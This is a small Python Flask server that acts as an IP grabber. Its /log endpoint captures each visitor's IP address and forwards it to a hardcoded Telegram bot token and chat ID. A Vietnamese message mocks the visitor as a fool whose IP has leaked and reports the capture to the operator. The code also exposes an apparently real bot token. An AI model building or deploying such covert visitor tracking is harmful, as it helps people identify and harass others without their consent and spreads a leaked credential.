import os
import requests
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Thông tin bot
TELEGRAM_TOKEN = "8404713686:AAF2SmOuGZwu-jcdwNr3ewCTAr-WgCrAbV0"
CHAT_ID = "7239343492"

def send_to_telegram(ip):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": f"Thêm 1 Thằng Ngu Vừa Lộ Địa Chỉ IP Thưa Đại Ca Quân ĐZ. IP:  {ip}"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Telegram send failed:", e)

@app.route("/")
def home():
    return "Flask server is running!"

@app.route("/log", methods=["GET"])
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print("Thêm 1 Thằng Ngu Vừa Lộ Địa Chỉ IP Thưa Đại Ca Quân ĐZ. IP: ", ip)
    send_to_telegram(ip)
    return {"ip": ip}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
